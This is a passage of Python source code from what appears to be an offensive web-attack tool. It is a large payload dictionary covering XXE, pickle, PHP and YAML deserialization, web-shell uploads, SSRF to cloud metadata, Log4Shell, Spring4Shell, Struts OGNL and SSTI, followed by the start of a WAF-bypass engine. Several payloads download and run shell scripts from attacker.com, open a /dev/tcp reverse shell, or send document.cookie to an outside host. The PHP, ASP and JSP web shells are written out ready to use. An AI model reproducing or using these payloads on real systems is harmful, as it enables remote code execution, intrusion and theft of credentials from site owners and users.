            'admin\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        ]
    },

    # ---- XPath Injection (3) ----
    'xpath_inject': {
        'category': 'xpath',
        'subcat': 'injection',
        'description': 'XPath injection payloads',
        'payloads': [
            "' or '1'='1'",
            "' or ''='",
            "' or name()='username' or '1'='1",
            "' and string-length(name())>0 and '1'='1",
            "' or 1=1 or '",
            "' or name()='*' or '",
            "' OR 'a'='a",
            "' or boolean(true) or '",
        ]
    },
    'xpath_blind': {
        'category': 'xpath',
        'subcat': 'blind',
        'description': 'Blind XPath injection',
        'payloads': [
            "' or string-length(username)=5 or '",
            "' or substring(username,1,1)='a' or '",
            "' or substring(username,1,1)='m' or '",
        ]
    },
    'xpath_ns': {
        'category': 'xpath',
        'subcat': 'namespace',
        'description': 'XPath namespace exploitation',
        'payloads': [
            "' or count(/*)=0 or '",
            "' or name()='username' or '",
        ]
    },

    # ---- XXE (4) ----
    'xxe_basic': {
        'category': 'xxe',
        'subcat': 'basic',
        'description': 'Basic XXE payloads',
        'payloads': [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
        ]
    },
    'xxe_blind': {
        'category': 'xxe',
        'subcat': 'blind',
        'description': 'Blind XXE with OOB',
        'payloads': [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com:8080">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY xxe2 SYSTEM "http://attacker.com/?data=%xxe;">]><root>&xxe2;</root>',
        ]
    },
    'xxe_dos': {
        'category': 'xxe',
        'subcat': 'dos',
        'description': 'XXE DoS (Billion Laughs)',
        'payloads': [
            '<?xml version="1.0"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol "lol">\n  <!ENTITY lol2 "&lol;&lol;&lol;&lol;">\n  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;">\n  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;">\n  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;">\n  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;">\n  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;">\n  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;">\n  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;">\n]>\n<lolz>&lol9;</lolz>',
        ]
    },
    'xxe_bom': {
        'category': 'xxe',
        'subcat': 'bom',
        'description': 'BOM-based XXE bypass',
        'payloads': [
            '\xef\xbb\xbf<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ]
    },

    # ---- Deserialization (5) ----
    'deser_java': {
        'category': 'deser',
        'subcat': 'java',
        'description': 'Java deserialization payloads',
        'payloads': [
            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFpZXCgMxAAJGAA9sb2FkRmFjdG9ySQAAUkkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAANAAAAAB3DAAAAX3IAB29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9yLlRyYW5zZm9ybWVkVHVibmVyAAAAAAAAAAIAAHhyABFvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVy……',
        ]
    },
    'deser_python': {
        'category': 'deser',
        'subcat': 'python',
        'description': 'Python deserialization payloads',
        'payloads': [
            'cos\nsystem\n(S"id"\n.',
            'cos\nsystem\n(S"cat /etc/passwd"\n.',
            'cos\nsystem\n(S"wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh"\n.',
            'cbs6\nEval\nV(S"__import__(\'os\').popen(\'id\').read()"\n.',
            'cpickletools\nexec\nV(S"os.system(\'id\')"\n.',
        ]
    },
    'deser_php': {
        'category': 'deser',
        'subcat': 'php',
        'description': 'PHP deserialization payloads',
        'payloads': [
            'O:8:"stdClass":0:{}',
            'O:4:"User":1:{s:9:"\0*\0username";s:5:"admin";}O:9:"Blacklist":0:{}',
            'O:4:"Test":1:{s:4:"test";O:27:"mysqli_result":0:{}}',
            'O:17:"PHPStan\\Printer":0:{}",O:8:"stdClass":0:{"0":""}',
        ]
    },
    'deser_ruby': {
        'category': 'deser',
        'subcat': 'ruby',
        'description': 'Ruby deserialization payloads',
        'payloads': [
            '--- !ruby/object:Gem::Installer\n    i: x\n--- !ruby/object:Gem::SourceFetcher\n    i: x',
            '--- !ruby/object:Kernel {} direval\n- echo pwned',
            '--- !ruby/class Open3\n--- !ruby/object FileUtils\n cmd: id',
        ]
    },
    'deser_yaml': {
        'category': 'deser',
        'subcat': 'yaml',
        'description': 'YAML deserialization payloads',
        'payloads': [
            '!ruby/object:Kernel {} sist: id',
            '!!python/object/apply:os.system ["id"]',
            '!!python/object/apply:subprocess.Popen [["id"]]',
        ]
    },

    # ---- Open Redirect (5) ----
    'redirect_basic': {
        'category': 'redirect',
        'subcat': 'basic',
        'description': 'Basic open redirect',
        'payloads': [
            'http://attacker.com',
            '//attacker.com',
            '/\\/\\/attacker.com',
            '\\\\attacker.com',
            'https://attacker.com',
            'javaScript:alert(1)',
        ]
    },
    'redirect_js': {
        'category': 'redirect',
        'subcat': 'js',
        'description': 'JavaScript-based redirect',
        'payloads': [
            'javascript:alert(1)',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'vbscript:MsgBox("XSS")',
        ]
    },
    'redirect_dotdot': {
        'category': 'redirect',
        'subcat': 'dotdot',
        'description': 'Dot-dot bypass',
        'payloads': [
            '///attacker.com',
            '////attacker.com',
            '...//attacker.com',
            '..\\/attacker.com',
        ]
    },
    'redirect_path_traversal': {
        'category': 'redirect',
        'subcat': 'path_traversal',
        'description': 'Path traversal redirect',
        'payloads': [
            '/..%2f..%2fattacker.com',
            '/%2e%2e/%2e%2e/attacker.com',
            '/./././././././././././attacker.com',
            '%2e%2e/%2e%2e/%2e%2e/attacker.com',
        ]
    },
    'redirect_golang_templ': {
        'category': 'redirect',
        'subcat': 'template',
        'description': 'Go template redirect',
        'payloads': [
            '{{redirect "http://attacker.com"}}',
            '{{.URL}}',
        ]
    },

    # ---- Upload (5) ----
    'upload_webshell': {
        'category': 'upload',
        'subcat': 'webshell',
        'description': 'Web shell uploads',
        'payloads': [
            ('shell.php', '<?php echo shell_exec($_GET["cmd"]); ?>'),
            ('shell.asp', '<% Execute(Request("cmd")) %>'),
            ('shell.aspx', '<%@ Page Language="C#" %><% Response.Write(System.IO.Directory.GetFiles(".")); %>'),
            ('shell.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'),
            ('shell.py', '#!/usr/bin/env python\nimport os\nos.system(os.environ.get("CMD","id"))'),
            ('shell.pl', '<?system($_GET[0]);?>'),
            ('shell.rb', '<%require"open3";puts Open3.capture3(params["cmd"])%>'),
            ('shell.cgi', '#!/bin/sh\n/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1'),
            ('shell.conf', '<FilesMatch ".+\\.ph(p[3457]?|t|tml|ar)|\\.p[lb]2?|\\.pht|\\.pHp|\\.phP|\\.pHp\\$|\\.pHP|\\.phP\\$|\\.PHp|\\.PHP|\\.phP\\$|\\.pHp\\$|\\.pHP|\\.PHp|\\.PHP\\$|\\.phar|\\.jpg)\\s*$">\nSetHandler application/x-httpd-php\n</FilesMatch>'),
        ]
    },
    'upload_bypass': {
        'category': 'upload',
        'subcat': 'bypass',
        'description': 'Upload bypass techniques',
        'payloads': [
            ('shell.php.jpg', '<?php echo shell_exec($_GET["cmd"]); ?>JFJlc3VsdD1SZXN1bHQ7'),
            ('shell.php.png', 'PNG\\r\\n\\x1a\\n<?php echo shell_exec($_GET["cmd"]); ?>'),
            ('shell.php.gif', 'GIF89a<?php echo shell_exec($_GET["cmd"]); ?>'),
            ('shell.phtml', '<?php echo shell_exec($_GET["cmd"]); ?>'),
            ('shell.PHP', '<?php echo shell_exec($_GET["cmd"]); ?>'),
            ('shell.php3', '<?php echo shell_exec($_GET["cmd"]); ?>'),
            ('shell.php4', '<?php echo shell_exec($_GET["cmd"]); ?>'),
            ('shell.php5', '<?php echo shell_exec($_GET["cmd"]); ?>'),
            ('shell.phAr', '<?php echo shell_exec($_GET["cmd"]); ?>'),
            ('shell.txt.php', '<?php echo shell_exec($_GET["cmd"]); ?>'),
            ('.htaccess', 'AddType application/x-httpd-php .txt\n<?php echo shell_exec($_GET["cmd"]); ?>'),
        ]
    },
    'upload_content_type': {
        'category': 'upload',
        'subcat': 'content_type',
        'description': 'Content-Type bypass',
        'payloads': [
            'application/x-php', 'application/php', 'application/phtml',
            'application/x-httpd-php', 'text/php', 'text/x-php',
            'image/gif', 'image/png', 'image/jpeg',
        ]
    },
    'upload_image_trick': {
        'category': 'upload',
        'subcat': 'image_trick',
        'description': 'Image trick uploads',
        'payloads': [
            'GIF89a<?php echo "pwned"; ?>',
            'GIF89a<GIF89a<GIF89a<?php echo shell_exec($_GET["cmd"]); ?>',
            'PK<?php echo shell_exec($_GET["cmd"]); ?>',
            '\x89PNG\r\n\x1a\n<?php echo shell_exec($_GET["cmd"]); ?>',
        ]
    },
    'upload_exif': {
        'category': 'upload',
        'subcat': 'exif',
        'description': 'EXIF injection upload',
        'payloads': [
            '<?php system($_GET["cmd"]); ?>',
        ]
    },

    # ---- Header Injection (3) ----
    'header_inject': {
        'category': 'header',
        'subcat': 'injection',
        'description': 'HTTP header injection',
        'payloads': [
            'Host: vulnerable.com\r\nX-Forwarded-For: 127.0.0.1\r\nCookie: admin=true\r\n',
            'Host: localhost:8080\r\n',
            'Host: internal.service.local\r\n',
            'X-Forwarded-Host: evil.com\r\n',
            'X-Forwarded-Server: evil.com\r\n',
            'Host: localhost\r\nX-Original-URL: /admin\r\n',
        ]
    },
    'header_smuggling_resp': {
        'category': 'header',
        'subcat': 'response_smuggling',
        'description': 'HTTP response splitting',
        'payloads': [
            '%0d%0aSet-Cookie: admin=true%0d%0a',
            '%0d%0aLocation: http://attacker.com%0d%0a',
            'HTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aSet-Cookie: session=hijacked%0d%0a%0d%0a<script>alert(1)</script>',
        ]
    },
    'header_request_smuggling': {
        'category': 'header',
        'subcat': 'request_smuggling',
        'description': 'HTTP request smuggling via headers',
        'payloads': [
            'X-Custom-Header: a\r\nContent-Length: 4\r\n\r\nGET',
            'X-Forwarded-Prefix: /admin\r\nContent-Length: 0\r\n\r\n',
        ]
    },

    # ---- CORS (3) ----
    'cors_bypass': {
        'category': 'cors',
        'subcat': 'bypass',
        'description': 'CORS bypass techniques',
        'payloads': [
            '*', 'null', 'http://attacker.com', 'https://attacker.com', 'file://',
        ]
    },
    'cors_wildcard': {
        'category': 'cors',
        'subcat': 'wildcard',
        'description': 'Wildcard CORS',
        'payloads': [
            'Access-Control-Allow-Origin: *',
            'Access-Control-Allow-Credentials: true',
            'Access-Control-Allow-Headers: *',
            'Access-Control-Allow-Methods: *',
        ]
    },
    'cors_reflector': {
        'category': 'cors',
        'subcat': 'reflector',
        'description': 'Reflecting Origin CORS',
        'payloads': [
            'Origin: http://attacker.com',
            'Origin: null',
        ]
    },

    # ---- CSRF (2) ----
    'csrf_bypass': {
        'category': 'csrf',
        'subcat': 'bypass',
        'description': 'CSRF bypass',
        'payloads': [
            '<form action="http://target.com/api/transfer" method="POST">\n<input type="hidden" name="amount" value="999999">\n<input type="hidden" name="to" value="attacker">\n<input type="submit" value="Claim Prize!">\n</form>',
            '<img src="http://target.com/api/delete-account" onerror="fetch(\'http://attacker.com/log?status=deleted\')">',
        ]
    },
    'csrf_token_reuse': {
        'category': 'csrf',
        'subcat': 'token_reuse',
        'description': 'CSRF token reuse',
        'payloads': [
            'Use previously captured CSRF token',
            'CSRF token in meta tag: <meta name="csrf" content="TOKEN">',
        ]
    },

    # ---- Mass Assignment (2) ----
    'mass_assignment': {
        'category': 'mass_assignment',
        'subcat': 'assignment',
        'description': 'Mass assignment abuse',
        'payloads': [
            '{"username": "user", "role": "admin", "is_admin": true, "is_banned": false}',
            '{"price": 0.01, "original_price": 999.99}',
            '{"user_id": 1, "is_premium": true, "isAdmin": true}',
        ]
    },
    'mass_assignment_graphql': {
        'category': 'mass_assignment',
        'subcat': 'graphql',
        'description': 'GraphQL mass assignment',
        'payloads': [
            '{"mutation{$updateUser(id:"1"){input:{role:"admin"}}){user{id role}}}',
            '{"mutation{$createOrder(id:"1"){input:{price:0.01,promoCode:"FREE"}}){order{id price}}}',
        ]
    },

    # ---- IDOR (3) ----
    'idor_basic': {
        'category': 'idor',
        'subcat': 'basic',
        'description': 'Insecure Direct Object Reference',
        'payloads': [
            '/api/users/1', '/api/users/2', '/api/users/3',
            '/api/orders/1', '/api/orders/2',
            '/api/files/document.pdf?id=1',
        ]
    },
    'idor_parameter': {
        'category': 'idor',
        'subcat': 'parameter',
        'description': 'Parameter manipulation',
        'payloads': [
            'id=1&user_id=2', 'account_id=12345', 'ref=ABC123', 'order_id=1',
        ]
    },
    'idor_enum': {
        'category': 'idor',
        'subcat': 'enumeration',
        'description': 'IDOR enumeration',
        'payloads': [
            '/api/users?offset=0&limit=100',
            '/api/data?page=1', '/api/data?page=99999',
        ]
    },

    # ---- Webhook / SSE (3) ----
    'webhook_inject': {
        'category': 'webhook',
        'subcat': 'injection',
        'description': 'Webhook injection',
        'payloads': [
            'http://attacker.com/webhook',
            'https://attacker.com/payload',
            'http://169.254.169.254/latest/meta-data/',
        ]
    },
    'sse_inject': {
        'category': 'sse',
        'subcat': 'injection',
        'description': 'Server-Sent Events injection',
        'payloads': [
            'data: <script>alert(1)</script>',
            'event: notification\ndata: {"html": "<img src=x onerror=alert(1)>"}',
        ]
    },
    'webhook_ooob': {
        'category': 'webhook',
        'subcat': 'ooob',
        'description': 'Out-of-band webhook',
        'payloads': [
            'https://.interact.sh/send',
            'https://burpcollaborator.net/',
            'http://localhost:8080/admin',
        ]
    },

    # ---- OAuth (3) ----
    'oauth_fixation': {
        'category': 'oauth',
        'subcat': 'fixation',
        'description': 'OAuth fixation attack',
        'payloads': [
            'oauth_token=attacker_token',
            'oauth_verifier=attacker_verifier',
        ]
    },
    'oauth_pkce': {
        'category': 'oauth',
        'subcat': 'pkce',
        'description': 'PKCE bypass',
        'payloads': [
            'code_verifier=attacker_verifier',
            'code_challenge=attacker_challenge',
        ]
    },
    'oauth_redirect': {
        'category': 'oauth',
        'subcat': 'redirect',
        'description': 'OAuth redirect URI manipulation',
        'payloads': [
            'redirect_uri=http://attacker.com/callback',
            'redirect_uri=http://localhost:8080/callback',
            'redirect_uri=urn:ietf:wg:oauth:2.0:oob',
        ]
    },

    # ---- Token (4) ----
    'token_replay': {
        'category': 'token',
        'subcat': 'replay',
        'description': 'Token replay attacks',
        'payloads': [
            'Authorization: Bearer [REDACTED_BEARER]',
            'Cookie: session=[REDACTED_SESSION]',
        ]
    },
    'token_refresh': {
        'category': 'token',
        'subcat': 'refresh',
        'description': 'Token refresh abuse',
        'payloads': [
            '{"refresh_token": "[STOLEN_REFRESH_TOKEN]"}',
            '{"grant_type": "refresh_token", "refresh_token": "[STOLEN]"}',
        ]
    },
    'token_weak_secret': {
        'category': 'token',
        'subcat': 'weak_secret',
        'description': 'Weak JWT/HMAC secrets',
        'payloads': [
            'secret', 'password', 'jwt_secret', 'changeme', 'supersecret',
            'mysecret', '123456', 'admin', 'key',
        ]
    },
    'token_bruteforce': {
        'category': 'token',
        'subcat': 'bruteforce',
        'description': 'Token brute force wordlist',
        'payloads': [
            'secret', 'password', 'key', 'admin', 'token', 'jwt',
            'mysecret', 'secretkey', 'supersecret', 'changeme',
        ]
    },

    # ---- Open Redirect URL (3) ----
    'open_redirect_url': {
        'category': 'redirect',
        'subcat': 'url',
        'description': 'URL-based open redirect',
        'payloads': [
            '?url=http://attacker.com', '?redirect=http://attacker.com',
            '?next=http://attacker.com', '?return=http://attacker.com',
            '?goto=http://attacker.com', '?dest=http://attacker.com',
            '?r=http://attacker.com', '?url=//attacker.com',
            '?url=/\\/attacker.com', '?url=\\%5c%5cattacker.com',
        ]
    },
    'open_redirect_email': {
        'category': 'redirect',
        'subcat': 'email',
        'description': 'Email-based redirect for phishing',
        'payloads': [
            '?next=https://attacker.com/login?ref=email',
            '?redirect=https://evil.com/phish',
        ]
    },
    'open_redirect_trusted': {
        'category': 'redirect',
        'subcat': 'trusted_domain',
        'description': 'Trusted domain redirect abuse',
        'payloads': [
            '?url=https://attacker.evil.com',
            '?redirect=http://attacker.com',
            '?next=//attacker.com',
        ]
    },

    # ---- Subdomain Takeover (2) ----
    'subdomain_takeover': {
        'category': 'subdomain_takeover',
        'subcat': 'takeover',
        'description': 'Subdomain takeover techniques',
        'payloads': [
            'cname-challenge.verifying.domain',
            'github.com', 'bitbucket.org', 'shopify.com',
        ]
    },
    'subdomain_cname': {
        'category': 'subdomain_takeover',
        'subcat': 'cname',
        'description': 'CNAME misconfiguration',
        'payloads': [
            'CNAME: attacker.com',
        ]
    },

    # ---- CSP Bypass (2) ----
    'csp_bypass': {
        'category': 'csp',
        'subcat': 'bypass',
        'description': 'Content Security Policy bypass',
        'payloads': [
            'report-uri http://attacker.com/collect',
            'default-src *', 'script-src *', 'connect-src *',
            'img-src * data:', 'font-src *', 'frame-src *', 'object-src *',
        ]
    },
    'csp_js_inject': {
        'category': 'csp',
        'subcat': 'js_inject',
        'description': 'CSP JS injection',
        'payloads': [
            '<script src="https://attacker.com/exfil.js"></script>',
            '<script>fetch("https://attacker.com/?c="+document.cookie)</script>',
        ]
    },

    # ---- SSRF Cloud Metadata (2) ----
    'ssrf_cloud_meta': {
        'category': 'ssrf',
        'subcat': 'cloud_metadata',
        'description': 'Cloud metadata SSRF',
        'payloads': [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/meta-data/hostname',
            'http://169.254.169.254/latest/meta-data/public-keys/',
            'http://169.254.169.254/latest/dynamic/instance-identity/document',
            'http://100.100.100.200/latest/meta-data/',
            'http://100.100.100.200/latest/meta-data/iam/security-credentials/',
            'http://[::1]:8080',
            'http://[0:0:0:0:0:ffff:169.254.169.254]/',
        ]
    },
    'ssrf_cloud_aws': {
        'category': 'ssrf',
        'subcat': 'aws_specific',
        'description': 'AWS-specific SSRF',
        'payloads': [
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance',
            'http://169.254.169.254/latest/meta-data/spot/termination-time',
            'http://169.254.169.254/latest/user-data',
            'http://169.254.169.254/latest/api/token',
        ]
    },

    # ---- Advanced Exploits (8) ----
    'log4shell': {
        'category': 'rce',
        'subcat': 'log4shell',
        'description': 'Log4Shell JNDI injection (CVE-2021-44228)',
        'payloads': [
            '${jndi:ldap://attacker.com:1389/a}',
            '${jndi:rmi://attacker.com:1099/a}',
            '${jndi:dns://attacker.com/a}',
            '${jndi:nis://attacker.com/a}',
            '${jndi:nds://attacker.com/a}',
            '${${lower:j}ndi:${lower:l}dap://${lower:a}ttacker.com:1389/a}',
            '${jndi:ldap://attacker.com:1389/Basic/Command/Base64/Q2FsY3VsYXRl}',
            '${jndi:ldap://attacker.com:1389/Exploit}',
        ]
    },
    'phpggc_fast': {
        'category': 'deser',
        'subcat': 'phpggc_fast',
        'description': 'PHPGGC FastEXE gadget chain',
        'payloads': [
            'O:25:"SymfonyComponentHttpFoundationRequest":5:{s:3:"x";O:29:"SymfonyComponentFinderFilenameEvaluator":1:{s:4:"files";a:1:{0;O:23:"SymfonyComponentFinderFileinfoFilter":1:{s:5:"expr";s:21:"system($_GET[cmd])";}}}s:6:"attributes";a:1:{s:9:"request_context";O:30:"SymfonyComponentRoutingRouteCollection":1:{s:10:"routes";a:1:{s:6:"export";R:2;}}}s:1:"a";R:5;s:5:"headers";O:32:"SymfonyComponentHttpFoundationHeaderBag":2:{i:0;O:29:"SymfonyComponentFinderFilenameEvaluator":1:{s:4:"files";a:1:{0;R:3}}i:1;s:10:"User-Agent";s:47:"mozilla/5.0";}}',
        ]
    },
    'phpggc_rce': {
        'category': 'deser',
        'subcat': 'phpggc_rce',
        'description': 'PHPGGC RCE gadget chain',
        'payloads': [
            'O:17:"GuzzleHttpPsr7Stream":3:{s:3:"str";s:11:"index.php";s:8:"metadata";a:1:{s:4:"uri";a:1:{s:8:"attributes";a:1:{s:6:"stream";O:22:"GuzzleHttpPsr7CachingStream":1:{s:4:"stream";s:53:"php://filter/convert.base64-decode/resource=shell.php";}}}s:4:"size";i:3243367;s:6:"offset";i:0;}}',
            'O:11:"SplFileObject":2:{s:4:"path";s:12:"/etc/passwd";s:6:"controls";i:0;}',
        ]
    },
    'java_deser_cc1': {
        'category': 'deser',
        'subcat': 'java_cc1',
        'description': 'Java CommonsCollections1 deserialization',
        'payloads': [
            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFpZXCgMxAAJGAA9sb2FkRmFjdG9ySQAAUkkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAANAAAAABdAACZORUVRVVMFNV9NRVRIT0QEc3RhcnRlclRBcmdzcQB-7gUAABx0ACJAZGVmYXVsdFZhbHVlVXNlckRh dGFiYXNlQWNjZXNz',
        ]
    },
    'python_pickle_rce': {
        'category': 'deser',
        'subcat': 'python_pickle',
        'description': 'Python pickle deserialization RCE',
        'payloads': [
            'cos\nsystem\nS"id"\n.',
            'cos\nsystem\nS"cat /etc/passwd"\n.',
            'cos\nsystem\nS"wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh"\n.',
            'cbs6\nEval\nV(S\"__import__(chr(111)+chr(115)).popen(chr(105)+chr(100)).read()\"\n.',
        ]
    },
    'ssrf_gopher_redis': {
        'category': 'ssrf',
        'subcat': 'gopher_redis',
        'description': 'SSRF via Gopher protocol to Redis',
        'payloads': [
            'gopher://attacker.com:6379/_INFO',
            'gopher://attacker.com:6379/_SET shell "<?php echo shell_exec($_GET[\'cmd\']); ?>"',
            'gopher://attacker.com:6379/_CONFIG SET dir /var/www/html/',
            'gopher://attacker.com:6379/_CONFIG SET dbfilename shell.php',
            'gopher://attacker.com:6379/_BGSAVE',
            'gopher://127.0.0.1:6379/_INFO',
        ]
    },
    'ssrf_gopher_mongo': {
        'category': 'ssrf',
        'subcat': 'gopher_mongodb',
        'description': 'SSRF via Gopher protocol to MongoDB',
        'payloads': [
            'gopher://attacker.com:27017/_delete.%00%00%00%00%00%00%00%00%00%00%00%00%00',
            'gopher://127.0.0.1:27017/_db.adminCommand(%22ismaster%22)%00',
        ]
    },
    'spring4shell': {
        'category': 'rce',
        'subcat': 'spring4shell',
        'description': 'Spring 4Shell RCE (CVE-2022-22965)',
        'payloads': [
            'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22data%22)))%7B%20java.io.InputStream%20in%3D%25%7Bc1%7Di%20in%3D%25%7Bc3%7Di%20%25%7Bc4%7Di%3A%20%25%7Bc5%7Di%3B%20%7B%20%25%7Bc6%7Di%20b%20%3D%20new%20byte%5B2048%5D%3B%20%25%7Bc7%7Di%20while%28in.read%28b%29!%3D-1%29%7B%20%25%7Bc8%7Di%20 response.getOutputStream%28%29.write%28b%29%3B%20%7D%20%7D%7D&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.first.prefix=valves&class.module.classLoader.resources.defaultURI.encoding=UTF-8',
        ]
    },
    'struts_rce': {
        'category': 'rce',
        'subcat': 'struts',
        'description': 'Apache Struts RCE (CVE-2023-50164)',
        'payloads': [
            ' %{(#nike=\'POIT\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'id\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.write(1)).(#bufferedInput=new java.io.BufferedReader(new java.io.InputStreamReader(#process.getInputStream()))).(#ros.write(#bufferedInput.toString())).(#ros.flush()))}',
        ]
    },

    # ---- New categories ----
    'http_host_header': {
        'category': 'header',
        'subcat': 'host_injection',
        'description': 'Host header injection for SSRF/password reset',
        'payloads': [
            'Host: internal-service.local',
            'Host: 127.0.0.1:8080',
            'Host: localhost',
            'Host: admin.internal.corp',
        ]
    },
    'open_redirect_param': {
        'category': 'redirect',
        'subcat': 'param',
        'description': 'Parameter-based open redirect',
        'payloads': [
            '?redir=http://attacker.com', '?orig=http://attacker.com',
            '?ret=http://attacker.com', '?callback=http://attacker.com',
            '?continue=http://attacker.com', '?returnUrl=http://attacker.com',
            '?next_url=http://attacker.com', '?dest=http://attacker.com',
            '?page=http://attacker.com', '?rurl=http://attacker.com',
            '?url=http://attacker.com', '?path=http://attacker.com',
        ]
    },
    'ssti_jade': {
        'category': 'ssti',
        'subcat': 'jade',
        'description': 'Jade/Pug template injection',
        'payloads': [
            '#{constructor.constructor("return process")().mainModule.require("child_process").execSync("id").toString()}',
            '#{process.mainModule.require("child_process").execSync("id").toString()}',
        ]
    },
    'ssti_handlebars': {
        'category': 'ssti',
        'subcat': 'handlebars',
        'description': 'Handlebars template injection',
        'payloads': [
            '{{#with "satisfaction" as |string|}}{{downstring}}{{/with}}',
            '{{this}} {{cons}}',
        ]
    },
    'ssrf_server_side': {
        'category': 'ssrf',
        'subcat': 'server_side',
        'description': 'Server-side request forgery via URL parameter',
        'payloads': [
            'url=http://169.254.169.254',
            'proxy=http://127.0.0.1:8080',
            'fetch=http://internal.local/admin',
            'destination=http://10.0.0.1',
        ]
    },
    'xxe_dom': {
        'category': 'xxe',
        'subcat': 'dom',
        'description': 'DOM-based XXE',
        'payloads': [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ]
    },
    'idor_api_enum': {
        'category': 'idor',
        'subcat': 'api_enum',
        'description': 'API endpoint IDOR enumeration',
        'payloads': [
            'GET /api/v1/users/1',
            'GET /api/v1/accounts/1',
            'GET /api/v1/orders/1',
            'GET /api/v1/documents/1',
        ]
    },
    'oauth_token_exchange': {
        'category': 'oauth',
        'subcat': 'token_exchange',
        'description': 'OAuth token exchange abuse',
        'payloads': [
            'grant_type=authorization_code&code=STOLEN_CODE',
            'grant_type=refresh_token&refresh_token=STOLEN_REFRESH',
        ]
    },
}


# =========================================================================
# WAF Bypass Engine v2 — Cascading Multi-Encoding
# =========================================================================

class WAFBypassEngine:
    """Engine de bypass de WAF com técnicas multi-camada e cascata."""

    WAF_SIGNATURES = {
        'sqlmap': [r"union\s+select", r"or\s+1\s*=\s*1", r"--\s*$", r"/\*.*\*/"],
        'modsecurity': [r"<script", r"javascript:", r"onerror=", r"onload=", r"eval\(", r"exec\("],
        'cloudflare': [r"eval\(", r"exec\(", r"system\(", r"passthru\(", r"union\s+select", r"<script"],
        'akamai': [r"benchmark", r"sleep\s*\(", r"waitfor", r"union\s+select", r"<script"],
        'aws_waf': [r"select.*from", r"concat\s*\(", r"char\s*\(", r"union\s+select", r"<script"],
        'imperva': [r"union\s+select", r"<script", r"eval\(", r"exec\("],
        'f5_bigip': [r"union\s+select", r"<script", r"benchmark"],
    }

    def __init__(self):
        self.bypass_techniques = self._load_bypass_techniques()

    def _load_bypass_techniques(self):
        return {
            'encoding': ['url', 'unicode', 'hex', 'base64', 'double_url', 'html_entity', 'octal', 'decimal'],
            'case': ['mixed_case', 'random_case', 'upper_lower'],
            'comment': ['sql_comment', 'html_comment', 'c_comment', 'js_comment'],
            'char_replace': ['tab_space', 'newline', 'null_byte', 'unicode_space'],
            'multipart': ['chunked', 'multipart_form', 'double_decode', 'percent_double'],
            'cascading': ['url_hex_url', 'hex_base64_hex', 'url_base64_url', 'double_url_hex'],
            'waf_specific': {
                'sqlmap': ['union+select', 'or+1=1', 'sleep(5)', 'benchmark(10000000,sha1(1))'],
                'modsecurity': ['<scr%00ipt>', '<img%20src=x%20onerror=alert(1)>', '%3Cscript%3Ealert(1)%3C/script%3E'],
